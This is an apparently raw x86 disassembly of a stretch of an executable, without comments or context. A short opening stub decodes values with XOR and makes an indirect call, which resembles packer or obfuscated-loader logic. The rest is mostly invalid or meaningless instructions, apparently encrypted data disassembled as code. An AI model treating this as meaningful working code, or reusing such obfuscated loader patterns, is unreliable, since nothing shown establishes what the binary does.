  40cb91:	sar    DWORD PTR [ebp+0x307bef5],cl
  40cb97:	(bad)  
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8-0x7d]
  40cbfc:	test   eax,0x8c62c128
  40cc01:	jle    0x40cc81
  40cc03:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40cc07:	xchg   cl,al
  40cc09:	mov    bl,0xfa
  40cc0b:	(bad)  
  40cc0c:	mov    ah,0xa
  40cc0e:	sbb    BYTE PTR [ecx],ch
  40cc10:	rep stos BYTE PTR es:[edi],al
  40cc12:	in     al,dx
  40cc13:	jno    0x40cc8a
  40cc15:	test   eax,0xccc6b33c
  40cc1a:	jns    0x40cc74
  40cc1c:	(bad)  
  40cc1d:	addr16 ja 0x40cc9e
  40cc20:	mov    ebp,0x148add56
  40cc25:	dec    ebx
  40cc26:	xor    ecx,0xffffffda
  40cc29:	sti    
  40cc2a:	jo     0x40cc92
  40cc2c:	retf   0x6ffb
  40cc2f:	fisubr WORD PTR [eax]
  40cc31:	repz push esi
  40cc33:	inc    ecx
  40cc34:	inc    ebx
  40cc35:	fbld   TBYTE PTR [ebx]
  40cc37:	cmp    eax,0x263ad48b
  40cc3c:	and    BYTE PTR [eax],bh
  40cc3e:	in     eax,dx
  40cc3f:	aaa    
  40cc40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc41:	mov    al,0xe3
  40cc43:	or     DWORD PTR [edx],0xac8adcf0
  40cc49:	jmp    0x8a81:0xe0934456
  40cc50:	sbb    DWORD PTR [esi],eax
  40cc52:	ret    
  40cc53:	clc    
  40cc54:	aam    0x8e
  40cc56:	push   0xffffffdd
  40cc58:	sbb    DWORD PTR [ecx],ecx
  40cc5a:	test   al,0x65
  40cc5c:	push   ebx
  40cc5d:	xor    ah,BYTE PTR [bx+di-0x526e]
  40cc62:	pop    edi
  40cc63:	pushf  
  40cc64:	bound  ecx,QWORD PTR [eax-0x4be9d111]
  40cc6a:	xor    ecx,DWORD PTR [ebx-0x417d6e76]
  40cc70:	mov    ah,0x3e
  40cc72:	popf   
  40cc73:	push   ebx
  40cc74:	lods   eax,DWORD PTR ds:[esi]
  40cc75:	cli    
  40cc76:	mov    ah,0x2c
  40cc78:	pop    es
  40cc79:	rcr    DWORD PTR [ebp-0x6936e3f1],cl
  40cc7f:	or     eax,0xbf119ba6
  40cc84:	in     al,dx
  40cc85:	jae    0x40cc92
  40cc87:	pop    edi
  40cc88:	(bad)  
  40cc89:	(bad)  
  40cc8a:	mov    esi,0x366f9323
  40cc8f:	ja     0x40cc30
  40cc91:	fadd   st(1),st
  40cc93:	daa    
  40cc94:	pushf  
  40cc95:	mov    eax,ds:0x811a1917
  40cc9a:	ins    DWORD PTR es:[edi],dx
  40cc9b:	push   ds
  40cc9c:	lods   al,BYTE PTR ds:[esi]
  40cc9d:	div    DWORD PTR ds:0xec84579e
  40cca3:	mov    es,WORD PTR [esi]
  40cca5:	inc    esi
  40cca6:	fild   WORD PTR [ebx+0x1739569e]
  40ccac:	sahf   
  40ccad:	push   es
  40ccae:	jl     0x40cc7b
  40ccb0:	shl    DWORD PTR [esi],cl
  40ccb2:	test   BYTE PTR [edx+0x5d],0x35
  40ccb6:	lahf   
  40ccb7:	sub    eax,0x43d43a25
  40ccbc:	adc    esp,DWORD PTR [edx+0x53]
  40ccbf:	(bad)  
  40ccc0:	(bad)  
  40ccc1:	and    bl,BYTE PTR [esi-0x7ff6de75]
  40ccc7:	jg     0x40cc55
  40ccc9:	leave  
  40ccca:	fcomp  QWORD PTR [edi+0x2a]
  40cccd:	leave  
  40ccce:	mov    ch,0x13
  40ccd0:	inc    ebp
  40ccd1:	shl    edi,1
  40ccd3:	test   eax,0x8ecce11a
  40ccd8:	into   
  40ccd9:	movlps QWORD PTR [eax+ebp*1],xmm1
  40ccdd:	xchg   BYTE PTR [ecx],bl
  40ccdf:	mov    es,WORD PTR [esi]
  40cce1:	das    
  40cce2:	push   esp
  40cce3:	pop    es
  40cce4:	ins    BYTE PTR es:[edi],dx
  40cce5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cce6:	imul   eax,eax,0x5e
  40cce9:	stos   DWORD PTR es:[edi],eax
  40ccea:	cmp    BYTE PTR [esp+ebp*8-0x7f2e1245],bl
  40ccf1:	aas    
  40ccf2:	or     BYTE PTR ds:0x1f124d6d,bl
  40ccf8:	jb     0x40cce2
  40ccfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccfb:	mov    WORD PTR [ecx],ss
  40ccfd:	adc    al,0x64
  40ccff:	xchg   DWORD PTR [eax+0x7],ebp
  40cd02:	(bad)  
  40cd03:	pop    ebp
  40cd04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd05:	adc    al,0x7
  40cd07:	outs   dx,BYTE PTR ds:[esi]
  40cd08:	imul   ecx,DWORD PTR [eax+0x6d],0x68d5a2ef
  40cd0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd10:	xor    al,0x24
  40cd12:	push   es
  40cd13:	mov    cs,eax
  40cd15:	mov    esp,0x71d97527
  40cd1a:	dec    edx
  40cd1b:	cld    
  40cd1c:	add    cl,bl
  40cd1e:	xor    DWORD PTR [ebp+0x6a],esi
  40cd21:	nop
  40cd22:	xor    eax,0x63779105
  40cd27:	jle    0x40cd47
  40cd29:	jno    0x40cd38
  40cd2b:	shl    BYTE PTR [ebx+0x507792dc],1
  40cd31:	fs repnz cmp ah,0x1b
  40cd36:	xchg   ecx,eax
  40cd37:	lods   eax,DWORD PTR ds:[esi]
  40cd38:	clc    
  40cd39:	sbb    ebx,esp
  40cd3b:	add    ch,BYTE PTR [esi+0x2]
  40cd3e:	xchg   edx,ebp
  40cd40:	into   
  40cd41:	scas   al,BYTE PTR es:[edi]
  40cd42:	jne    0x40cd42
  40cd44:	out    dx,al
  40cd45:	jns    0x40cd30
  40cd47:	nop
  40cd48:	iret   
  40cd49:	jb     0x40cdc2
  40cd4b:	cmp    al,0x99
  40cd4d:	sbb    cl,dh
  40cd4f:	clc    
  40cd50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd51:	gs cwde 
  40cd53:	mov    bl,0x22
  40cd55:	mov    dh,0x8d
  40cd57:	les    edi,FWORD PTR [ebx]
  40cd59:	es push edi
  40cd5b:	pop    es
  40cd5c:	pop    ecx
  40cd5d:	pop    ebp
  40cd5e:	ins    DWORD PTR es:[edi],dx
  40cd5f:	div    DWORD PTR cs:[edx+edx*1+0x7b]
  40cd64:	call   0xa4bb4331
  40cd69:	xchg   ecx,eax
  40cd6a:	xchg   ebx,eax
  40cd6b:	stos   DWORD PTR es:[edi],eax
  40cd6c:	mov    dh,0x8a
  40cd6e:	push   edi
  40cd6f:	or     al,0x99
  40cd71:	cld    
  40cd72:	aad    0xe8
  40cd74:	call   0xde1f660a
  40cd79:	sbb    esi,DWORD PTR [ebx]
  40cd7b:	rcr    DWORD PTR [edi-0x220bcb68],1
  40cd81:	mov    edx,0xfdc348a5
  40cd86:	out    dx,eax
  40cd87:	jecxz  0x40cd34
  40cd89:	ror    DWORD PTR [edi-0x54501acd],0x1e
  40cd90:	cmp    al,0xa5
  40cd92:	or     bl,dh
  40cd94:	lock ret 
  40cd96:	out    dx,al
  40cd97:	test   BYTE PTR [ebp-0x1d20550a],cl
  40cd9d:	push   ds
  40cd9e:	adc    eax,DWORD PTR [ebp+eax*4-0x78]
  40cda2:	(bad)  
  40cda3:	and    al,0x4c
  40cda5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cda6:	repz push ebx
  40cda8:	dec    ebx
  40cda9:	jp     0x40cd8e
  40cdab:	sub    eax,0xdbc1c3e2
  40cdb0:	mov    DWORD PTR [eax-0x70d2144],esp
  40cdb6:	rol    DWORD PTR [edx-0x2b57897d],1
  40cdbc:	adc    edx,DWORD PTR [ebx+eax*2]
  40cdbf:	mov    ds:0xd0e400fa,eax
  40cdc4:	call   0x22e2322
  40cdc9:	fwait
  40cdca:	scas   al,BYTE PTR es:[edi]
  40cdcb:	mov    ah,0x5f
  40cdcd:	sbb    ebx,DWORD PTR [esp+eiz*8-0x1b]
  40cdd1:	or     DWORD PTR [ebx-0x2f411c90],edx
  40cdd7:	adc    BYTE PTR [ecx+0x32],0x94
  40cddb:	push   eax
  40cddc:	mov    eax,0x41a07314
  40cde1:	sbb    ecx,DWORD PTR [edi+0x4c]
  40cde4:	mov    bl,BYTE PTR [eax-0x4b884edc]
  40cdea:	ins    BYTE PTR es:[edi],dx
  40cdeb:	test   al,0x35
  40cded:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdee:	sub    ah,BYTE PTR [esp+eiz*2-0xe]
  40cdf2:	inc    BYTE PTR [eax-0x7d]
  40cdf5:	xchg   edx,eax
  40cdf6:	jnp    0x40cda5
  40cdf8:	inc    eax
  40cdf9:	outs   dx,DWORD PTR ds:[esi]
  40cdfa:	mov    WORD PTR ss:[edi+0x4f1fa7b0],?
  40ce01:	cli    
  40ce02:	fst    st(1)
  40ce04:	mov    ch,0x7d
  40ce06:	push   DWORD PTR [ecx+0x25e5ba5e]
  40ce0c:	dec    edi
  40ce0d:	je     0x40ce0c
  40ce0f:	xchg   DWORD PTR [eax],ebp
  40ce11:	mov    ds:0xc92cdd8e,eax
  40ce17:	xor    esi,DWORD PTR [ebp-0x27e8e160]
  40ce1d:	or     al,0x6f
  40ce1f:	mov    ?,WORD PTR [eax+0x3f555c52]
  40ce25:	inc    esp
  40ce26:	pop    edi
  40ce27:	dec    bh
  40ce29:	dec    edx
  40ce2a:	and    eax,0x90197e5
  40ce2f:	dec    ebp
  40ce30:	dec    esi
  40ce31:	xchg   edi,eax
  40ce32:	scas   al,BYTE PTR es:[edi]
  40ce33:	retf   
  40ce34:	xchg   esp,eax
  40ce36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce37:	xchg   ah,al
  40ce39:	(bad)  
  40ce3a:	mov    ebx,0x265d5809
  40ce3f:	int    0x93
  40ce41:	inc    eax
  40ce42:	or     eax,0xd24dceb2
  40ce47:	adc    al,BYTE PTR [edi+esi*4]
  40ce4a:	and    bh,0xf6
  40ce4d:	sub    ebx,ecx
  40ce4f:	xchg   ebx,ecx
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	cs js  0x40ce5a
  40ce65:	aam    0x2c
  40ce67:	mov    edi,DWORD PTR [esi+0x7e]
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	(bad)  
  40ce6f:	xchg   esi,eax
  40ce70:	test   al,0x76
  40ce72:	mov    BYTE PTR [ebp+0x5f],ch
  40ce75:	jle    0x40ce56
  40ce77:	sbb    eax,0x84523c20
  40ce7c:	inc    eax
  40ce7d:	inc    ebx
  40ce7e:	(bad)  [edi]
  40ce80:	loop   0x40ce3a
  40ce82:	addr16 es dec esp
  40ce85:	in     eax,dx
  40ce86:	xlat   BYTE PTR ds:[ebx]
  40ce87:	cwde   
  40ce88:	sbb    ebx,DWORD PTR [ecx+0x7f39021b]
  40ce8e:	ins    DWORD PTR es:[edi],dx
  40ce8f:	cmp    BYTE PTR [ecx],al
  40ce91:	shl    BYTE PTR [edi],cl
  40ce93:	jmp    0x75dce5d6
  40ce98:	mov    DWORD PTR [edi+0x76143663],eax
  40ce9e:	push   cs
  40ce9f:	ins    BYTE PTR es:[edi],dx
  40cea0:	sub    BYTE PTR [ebx-0x6b8ab143],dh
  40cea6:	xchg   esp,eax
  40cea7:	imul   eax,DWORD PTR [edi],0x34cd3019
  40cead:	jns    0x40cef6
  40ceaf:	jnp    0x40cec4
  40ceb1:	mov    al,BYTE PTR [edx+0x72fc2f22]
  40ceb7:	sub    ebp,DWORD PTR [edi]
  40ceb9:	push   cs
  40ceba:	lea    esp,[ebx]
  40cebc:	fldenv [ecx+eax*8-0x39]
  40cec0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cec1:	scas   eax,DWORD PTR es:[edi]
  40cec2:	int    0x8e
  40cec4:	or     al,dl
  40cec6:	retf   0x1d1c
  40cec9:	(bad)  [edx-0x27e6d6e]
  40cecf:	loopne 0x40ce92
  40ced1:	fmul   QWORD PTR [ecx-0x140167f6]
  40ced7:	inc    ecx
  40ced8:	or     BYTE PTR [edx],0xe5
  40cedb:	add    eax,0x716af9ff
  40cee0:	pop    ecx
  40cee1:	scas   al,BYTE PTR es:[edi]
  40cee2:	lods   al,BYTE PTR ds:[esi]
  40cee3:	ror    BYTE PTR [edi],0x22
  40cee6:	and    al,bh
  40cee8:	push   edi
  40cee9:	push   cs
  40ceea:	add    al,0xf5
  40ceec:	std    
  40ceed:	imul   ebx,DWORD PTR [edi],0xe77fee45
  40cef3:	jecxz  0x40cf2d
  40cef5:	test   BYTE PTR [edx+esi*4],0x51
  40cef9:	pop    esp
  40cefa:	ret    
  40cefb:	(bad)  
  40cefc:	xchg   DWORD PTR [eax],ecx
  40cefe:	outs   dx,DWORD PTR ds:[esi]
  40ceff:	call   0x9f68b84b
  40cf04:	jb     0x40cf4f
  40cf06:	xchg   edx,eax
  40cf07:	fnstenv ds:0x780d801a
  40cf0d:	mov    ecx,ss
  40cf0f:	or     BYTE PTR [ecx-0x73a20e7a],bl
  40cf15:	ret    0x88f4
  40cf18:	ins    DWORD PTR es:[edi],dx
  40cf19:	into   
  40cf1a:	add    bh,BYTE PTR [ebp-0x277a6c39]
  40cf20:	loope  0x40ceaf
  40cf22:	lahf   
  40cf23:	xchg   edx,eax
  40cf24:	inc    eax
  40cf25:	bound  ecx,QWORD PTR [ecx-0x656234a9]
  40cf2b:	and    BYTE PTR [ebx],0x8c
  40cf2e:	mov    eax,0xf0614cfc
  40cf33:	sbb    al,0xa8
  40cf35:	push   es
  40cf36:	stc    
  40cf37:	add    eax,0xa1674665
  40cf3c:	or     esp,esp
  40cf3e:	vmulps xmm2,xmm4,XMMWORD PTR [ecx]
  40cf42:	sar    DWORD PTR [esi-0x5],cl
  40cf45:	loope  0x40cefc
  40cf47:	daa    
  40cf48:	mov    ah,0x8d
  40cf4a:	xchg   esi,eax
  40cf4b:	sbb    edx,DWORD PTR [edi-0x3b]
  40cf4e:	fistp  DWORD PTR [edi]
  40cf50:	rcl    bl,cl
  40cf52:	test   eax,0xe034cf81
  40cf57:	sub    DWORD PTR [edi],0x7e
  40cf5a:	cmp    al,0x8e
  40cf5c:	inc    edx
  40cf5d:	mov    ds:0x63093169,al
  40cf62:	xor    DWORD PTR [edi+0x3cde3db3],edx
  40cf68:	or     eax,0x2dd54955
  40cf6d:	std    
  40cf6e:	lods   al,BYTE PTR ds:[esi]
  40cf6f:	mov    al,0xe4
  40cf71:	push   cs
  40cf72:	es push esi
  40cf74:	jns    0x40cf08
  40cf76:	(bad)  
  40cf77:	stos   BYTE PTR es:[edi],al
  40cf78:	jg     0x40cfc5
  40cf7a:	pusha  
  40cf7b:	adc    BYTE PTR [ebx],dl
  40cf7d:	es inc eax
  40cf7f:	fsubr  DWORD PTR [ebp+0x4d43f0a9]
  40cf85:	xchg   esi,eax
  40cf86:	push   ds
  40cf87:	es push ecx
  40cf89:	adc    al,0xb7
  40cf8b:	adc    al,0x82
  40cf8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf8e:	dec    esi
  40cf8f:	xor    esp,ebp
  40cf91:	push   cs
  40cf92:	icebp  
  40cf93:	and    eax,0x38203bfb
  40cf98:	enter  0x322a,0xac
  40cf9c:	ds jmp 0xc3cdb4b8
  40cfa2:	in     al,0xd2
  40cfa4:	jle    0x40cf98
  40cfa6:	pop    esp
  40cfa7:	inc    ecx
  40cfa8:	push   edx
  40cfa9:	push   cs
  40cfaa:	cmp    DWORD PTR [ecx],esp
  40cfac:	mov    edx,0x54bd6d52
  40cfb1:	or     eax,DWORD PTR [eax+0x17743762]
  40cfb7:	ja     0x40cf9c
  40cfb9:	loope  0x40cf94
  40cfbb:	add    eax,0x82e17442
  40cfc0:	xchg   ecx,eax
  40cfc1:	push   sp
  40cfc3:	ins    DWORD PTR es:[edi],dx
  40cfc4:	out    0xe2,eax
  40cfc6:	jbe    0x40cf97
  40cfc8:	dec    edx
  40cfc9:	std    
  40cfca:	jbe    0x40cf99
  40cfcc:	repnz xchg ebp,eax
  40cfce:	inc    ecx
  40cfcf:	cmp    al,0xe4
  40cfd1:	lds    esp,FWORD PTR [edx]
  40cfd3:	xor    edi,ebp
  40cfd5:	fdiv   DWORD PTR [ebx]
  40cfd7:	call   0x38e3703f
  40cfdc:	jo     0x40d018
  40cfde:	and    dl,BYTE PTR [edx]
  40cfe0:	jle    0x40d01b
  40cfe2:	mov    eax,0xc08aa8fb
  40cfe7:	mov    bh,0x9a
  40cfe9:	and    BYTE PTR [ebp+0x2b],dh
  40cfec:	jbe    0x40d002
  40cfee:	ret    0xfe9e
  40cff1:	in     eax,dx
  40cff2:	xor    al,0x6e
  40cff4:	add    BYTE PTR [ebx+0x10963072],bl
  40cffa:	xor    BYTE PTR [ecx+0x2b],0xe0
  40cffe:	aam    0x8e
  40d000:	aas    
  40d001:	jge    0x40cfea
  40d003:	jnp    0x40cfe4
  40d005:	and    BYTE PTR [ebp-0x540bbc1a],bh
  40d00b:	mov    edx,es
  40d00d:	jl     0x40cff1
  40d00f:	add    ch,BYTE PTR [ebx+0x1362b7a9]
  40d015:	and    al,0x5f
  40d017:	sbb    DWORD PTR [edi],eax
  40d019:	pop    es
  40d01a:	pop    ebx
  40d01b:	dec    eax
  40d01c:	push   ecx
  40d01d:	clc    
  40d01e:	mov    edi,0x7fe1c149
  40d023:	mov    BYTE PTR [ebx+0x1cdb67df],ch
  40d029:	add    al,0x5b
  40d02b:	dec    esp
  40d02c:	repnz cmp al,0xb2
  40d02f:	cmp    DWORD PTR [ebp+eax*8-0x6d],ebx
  40d033:	mov    ecx,0x2180ed9f
  40d038:	sbb    bl,BYTE PTR [edx-0x20]
  40d03b:	push   esp
  40d03c:	push   DWORD PTR [esi-0x11778f00]
  40d042:	jge    0x40d003
  40d044:	pop    ds
  40d045:	lea    esi,[eax]
  40d047:	adc    dl,dl
  40d049:	mov    al,ds:0x8362ea66
  40d04e:	sbb    ch,cl
  40d050:	imul   eax,DWORD PTR [edx-0x6a],0x4c
  40d054:	add    al,0xb5
  40d056:	pop    ecx
  40d057:	push   edx
  40d058:	call   0x904ffb2
  40d05d:	ja     0x40d056
  40d05f:	ror    edi,cl
  40d061:	mov    ds:0x529dd9a,eax
  40d066:	aam    0xd9
  40d068:	pop    edx
  40d069:	jo     0x40d034
  40d06b:	addr16 mov eax,0x82cd8e28
  40d071:	xchg   ebp,eax
  40d072:	dec    edx
  40d073:	lahf   
  40d074:	add    al,0xba
  40d076:	jg     0x40d05e
  40d078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d079:	enter  0xc266,0x25
  40d07d:	gs stc 
  40d07f:	or     al,BYTE PTR [ebx]
  40d081:	add    al,0x12
  40d083:	xchg   esi,eax
  40d084:	dec    eax
  40d085:	mov    edi,0x706d6b0c
  40d08a:	push   ecx
  40d08b:	adc    DWORD PTR [eax],eax
  40d08d:	aam    0x52
  40d08f:	loope  0x40d06a
  40d091:	(bad)  
  40d093:	call   0x9e24:0xd009c680
  40d09a:	inc    edi
  40d09b:	repz call 0xa4c4:0xe9d47321
  40d0a3:	call   0x55bf:0x6b4e9f85
  40d0aa:	adc    cl,BYTE PTR [edx+0x64fc5195]
  40d0b0:	retf   
  40d0b1:	cli    
  40d0b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0b3:	sub    BYTE PTR [ecx-0x75],cl
  40d0b6:	inc    ebp
  40d0b7:	in     al,0xf
  40d0b9:	scas   eax,DWORD PTR es:[edi]
  40d0ba:	rol    DWORD PTR [ebx],0xe0
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	popa   
  40d0d0:	fcomp  QWORD PTR [ebx+0x2a]
  40d0d3:	test   BYTE PTR [ecx+0x7c387e7e],0x7e
  40d0da:	jle    0x40d05c
  40d0dc:	mov    eax,ds:0x348fc5ee
  40d0e1:	outs   dx,DWORD PTR ds:[esi]
  40d0e2:	adc    eax,0x9aec9015
  40d0e7:	inc    edi
  40d0e8:	add    eax,DWORD PTR ds:0xe8913373
  40d0ee:	out    dx,eax
  40d0ef:	fs inc esi
  40d0f1:	dec    ebx
  40d0f2:	sbb    DWORD PTR [ebx],edi
  40d0f4:	sub    al,0xf6
  40d0f6:	jae    0x40d0a5
  40d0f8:	js     0x40d15d
  40d0fa:	mov    bl,BYTE PTR [eax+ebp*8-0x58fc7c73]
  40d101:	jmp    DWORD PTR [eax-0x3f26a028]
  40d107:	bnd jmp DWORD PTR [ecx+ebx*2+0x19]
  40d10c:	inc    eax
  40d10d:	hlt    
  40d10e:	cmp    ebp,DWORD PTR [edx-0x53]
  40d111:	push   edi
  40d112:	dec    eax
  40d113:	aaa    
  40d114:	pop    eax
  40d115:	popa   
  40d116:	mov    al,ds:0xc1842ff
  40d11b:	lea    eax,[edx-0x6c]
  40d11e:	mov    al,0x71
  40d120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d121:	pusha  
  40d122:	aas    
  40d123:	dec    eax
  40d124:	jl     0x40d189
  40d126:	mov    ecx,0xd2ec779f
  40d12b:	pop    es
  40d12c:	add    DWORD PTR [edi],edx
  40d12e:	cmp    dl,BYTE PTR [ecx-0x1f574e9a]
  40d134:	not    DWORD PTR [ebp+eiz*1-0x80]
  40d138:	push   ds
  40d139:	xchg   esi,eax
  40d13a:	mov    eax,0x52f5a9de
  40d13f:	cmp    eax,0x33acb458
  40d144:	jbe    0x40d160
  40d146:	cmp    BYTE PTR [ebp+edi*2-0x68fbd46d],bl
  40d14d:	dec    esp
  40d14e:	sub    DWORD PTR [esp+eax*8],eax
  40d151:	sub    DWORD PTR [edx],eax
  40d153:	fst    st(6)
  40d155:	stos   DWORD PTR es:[edi],eax
  40d156:	pop    eax
  40d157:	retf   
  40d158:	mov    ah,BYTE PTR [esi+0xd]
  40d15b:	xchg   esp,eax
  40d15c:	clc    
  40d15d:	add    ch,ah
  40d15f:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40d161:	cli    
  40d162:	call   DWORD PTR [esi+ecx*2+0x36709ad2]
  40d169:	xlat   BYTE PTR ds:[ebx]
  40d16a:	adc    eax,ebx
  40d16c:	fisttp DWORD PTR [ecx+0x280f997c]
  40d172:	imul   ecx,DWORD PTR [edi],0xc0608663
  40d178:	sbb    ch,BYTE PTR [edi+eax*8+0x63dbda5d]
  40d17f:	rcl    DWORD PTR [edi-0xe],cl
  40d182:	pop    esi
  40d183:	sub    BYTE PTR [ebp-0x49eb6901],cl
  40d189:	retf   0x5f4c
  40d18c:	and    eax,ecx
  40d18e:	adc    esp,0xfffffff2
  40d191:	jge    0x40d114
  40d193:	lods   al,BYTE PTR ds:[esi]
  40d194:	cdq    
  40d195:	push   0x98b05fe7
  40d19a:	cmp    ah,ch
  40d19c:	xchg   BYTE PTR [edx+0x7b],ch
  40d19f:	jbe    0x40d20f
  40d1a1:	xor    bl,dh
  40d1a3:	mov    BYTE PTR [edx+0x6ceca4a2],bh
  40d1a9:	into   
  40d1aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1ab:	in     eax,dx
  40d1ac:	push   ecx
  40d1ad:	std    
  40d1ae:	ror    DWORD PTR [edx+0x552f601c],cl
  40d1b4:	out    dx,al
  40d1b5:	mov    ch,0xe2
  40d1b7:	jo     0x40d156
  40d1b9:	adc    edx,DWORD PTR ds:0x975d2508
  40d1bf:	test   BYTE PTR [edi-0x66],cl
  40d1c2:	xchg   ecx,eax
  40d1c3:	test   eax,0xe5a9ee61
  40d1c8:	add    eax,0x9464d0e
  40d1cd:	xchg   ebx,eax
  40d1ce:	pop    edi
  40d1cf:	sub    bl,cl
  40d1d1:	test   DWORD PTR ds:0xadb2e96f,esp
  40d1d7:	lea    edx,[ebx+0x38250a65]
  40d1dd:	or     esp,DWORD PTR [eax+0x3b210ea8]
  40d1e3:	adc    eax,0x65305261
  40d1e8:	fiadd  WORD PTR [ecx]
  40d1ea:	mov    edx,0x74539b8f
  40d1ef:	dec    ecx
  40d1f0:	mov    esp,ebp
  40d1f2:	jl     0x40d1ee
  40d1f4:	inc    eax
  40d1f5:	mov    eax,ds:0x1490c5d6
  40d1fa:	unpckhps xmm1,XMMWORD PTR gs:[edx-0x37]
  40d1ff:	push   esp
  40d200:	fs xchg si,ax
  40d203:	inc    edi
  40d204:	and    DWORD PTR [edx],esi
  40d206:	add    BYTE PTR [ebx],ch
  40d208:	push   es
  40d209:	mov    dh,BYTE PTR ds:0x51b04d70
  40d20f:	(bad)  
  40d210:	int    0x9c
  40d212:	arpl   di,bp
  40d214:	imul   edi,DWORD PTR [ebx],0xf4889c1e
  40d21a:	pusha  
  40d21b:	sbb    edi,DWORD PTR [eax]
  40d21d:	popa   
  40d21e:	fnstenv [ebp+0x388a9602]
  40d224:	cli    
  40d225:	push   0x7c2cff38
  40d22a:	jg     0x40d1f8
  40d22c:	pop    ds
  40d22d:	push   ds
  40d22e:	scas   al,BYTE PTR es:[edi]
  40d22f:	xor    ebx,DWORD PTR ds:0x76c5a9bb
  40d235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d236:	jb     0x40d276
  40d238:	push   esp
  40d239:	rcr    DWORD PTR [ebx-0x57],cl
  40d23c:	and    al,0x99
  40d23e:	pop    edi
  40d23f:	inc    ebx
  40d240:	popf   
  40d241:	mov    BYTE PTR [esi],bh
  40d243:	inc    ebx
  40d244:	loopne 0x40d1d8
  40d246:	dec    ebp
  40d247:	out    dx,eax
  40d248:	pop    ebx
  40d249:	xor    eax,0xa7b519c8
  40d24e:	scas   eax,DWORD PTR es:[edi]
  40d24f:	xor    eax,0xb9bae3da
  40d254:	add    al,0x90
  40d256:	ret    
  40d257:	ja     0x40d26d
  40d259:	push   0x69c19823
  40d25e:	frstor [edi-0x58a1db73]
  40d264:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40d266:	call   0x69e5:0x623890b2
  40d26d:	fstp   DWORD PTR [esi]
  40d26f:	xchg   dl,al
  40d271:	push   edi
  40d272:	mov    ch,0x87
  40d274:	int3   
  40d275:	icebp  
  40d276:	xchg   edi,eax
  40d277:	jle    0x40d2eb
  40d279:	enter  0x32d1,0x9a
  40d27d:	add    ebp,DWORD PTR [ebx]
  40d27f:	enter  0x35ad,0x98
  40d283:	das    
  40d284:	ja     0x40d284
  40d286:	push   ss
  40d287:	loop   0x40d2ce
  40d289:	dec    esi
  40d28a:	hlt    
  40d28b:	fistp  QWORD PTR [ecx+0x516d585f]
  40d291:	pop    edx
  40d292:	or     BYTE PTR [edi],0xf0
  40d295:	retf   0x7adf
  40d298:	iret   
  40d299:	dec    ecx
  40d29a:	push   edi
  40d29b:	cmp    al,0xe1
  40d29d:	pop    ds
  40d29e:	cmp    eax,0xabcb7521
  40d2a3:	aas    
  40d2a4:	mov    al,0x43
  40d2a6:	xor    BYTE PTR [edx],0x1c
  40d2a9:	inc    eax
  40d2aa:	or     BYTE PTR [edx+ebx*1-0x42],ah
  40d2ae:	fstp   TBYTE PTR [eax-0x4b31f7b6]
  40d2b4:	sub    eax,0xb0d2cab
  40d2b9:	dec    ecx
  40d2ba:	ss jge 0x40d299
  40d2bd:	test   al,0x87
  40d2bf:	cmp    eax,0xdf308242
  40d2c4:	cmp    al,0x42
  40d2c6:	pop    ss
  40d2c7:	stc    
  40d2c8:	bound  edx,QWORD PTR [esi+0x3]
  40d2cb:	gs addr16 sbb eax,0x66c62022
  40d2d2:	or     al,0x1c
  40d2d4:	lods   al,BYTE PTR ds:[esi]
  40d2d5:	pop    esi
  40d2d6:	adc    BYTE PTR [eax+0x17],bl
